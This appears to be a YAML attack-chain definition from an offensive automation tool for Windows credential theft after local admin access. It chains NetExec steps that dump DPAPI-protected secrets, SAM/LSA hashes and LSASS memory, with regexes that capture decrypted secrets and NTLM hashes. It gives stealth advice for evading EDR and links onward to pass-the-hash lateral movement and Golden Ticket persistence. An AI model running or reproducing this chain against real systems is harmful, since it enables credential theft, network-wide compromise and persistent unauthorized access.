id: dpapi-secrets-extraction
name: "Cred Access — DPAPI masterkey & blob extraction"
description: >
  Once you have local admin on a Windows host, DPAPI blobs decode every
  vault entry (RDP creds, Chrome cookies/passwords, scheduled-task secrets).
  The chain captures masterkeys + decrypts blobs without ever touching
  the user's plaintext password.
tags: [credential-access, dpapi, post-exploitation, windows]
difficulty: medium

inputs:
  - name: target_ip
    source: target_context.ip
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password

steps:
  - id: dpapi_remote
    name: "Remote DPAPI dump via NetExec"
    command_ref: nxc-dpapi-hash
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      Pulls credentials cached by every user that logged in. Watch for
      `LegacyGeneric:target=`, `Domain:target=`, and `MicrosoftAccount:`
      entries — those become PtH/PtT candidates for lateral movement.
    capture:
      - var: dpapi_secrets
        regex: '\[\+\]\s+Decrypted secret:\s*(.+)$'
        match: all

  - id: lsa_secrets
    name: "Also grab SAM/LSA secrets"
    command_ref: nxc-smb-sam-lsa
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    capture:
      - var: ntlm_hashes
        regex: '^([A-Za-z0-9._$-]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::'
        match: all
        groups: { user: 1, rid: 2, lm: 3, nt: 4 }

  - id: lsassy
    name: "Optionally also dump LSASS (in-memory creds)"
    command_ref: nxc-lsassy
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      Use only when you accept the EDR risk. Many CTF boxes don't have
      Defender enabled. Also try `--method nanodump` for stealthier dumps.

references:
  - title: "DPAPI internals"
    url:   "https://www.synacktiv.com/en/publications/operational-guidance-for-offensive-dpapi-abuse.html"
  - title: "HackTricks — DPAPI"
    url:   "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dpapi-extracting-passwords.html"

next_chains:
  - chain: pth-lateral-spread
    when:   'ntlm_hashes captured'
    reason: 'Cascading hashes → cascading lateral movement.'
  - chain: ad-persistence-golden-ticket
    when:   'krbtgt hash captured'
    reason: 'krbtgt → Golden Ticket persistence.'
